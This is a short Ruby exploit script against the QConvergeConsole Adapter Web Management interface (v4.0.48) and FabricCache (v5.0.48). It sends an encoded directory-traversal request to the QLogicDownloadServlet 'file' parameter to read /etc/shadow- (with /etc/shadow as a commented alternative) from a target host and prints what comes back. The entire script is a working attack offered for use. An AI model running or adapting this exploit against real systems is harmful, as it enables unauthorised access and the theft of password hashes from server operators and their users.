#!/usr/bin/env ruby
# QConvergeConsole Adapter Web Management Version: v4.0.48
# FabricCache Version: v5.0.48
# the QLogicDownloadImpl.class can be abused by a
# directory traversal in the 'file' param.

require 'rex'	

host = ARGV[0]

def usage
 puts "[*] #{$0} <host>"
 exit
end

usage if ARGV.size < 1

begin

sock = Rex::Proto::Http::Client.new(host, 
				    port = 8080, 
                                    context = {}, 
                                    ssl = false)


#file = "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow"
file = "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fshadow-"

req = sock.request_raw(
		{
			'uri'   => '/QConvergeConsole/com.qlogic.qms.hba.gwt.Main/QLogicDownloadServlet?file=' + file + '&folder=webapps/QConvergeConsole/',
			'method' => 'GET',
			'version' => '1.1',
		})

sock.send_request(req)
data = sock.read_response()
puts data.body

rescue => e

puts "[!] #{e.to_s}"

end
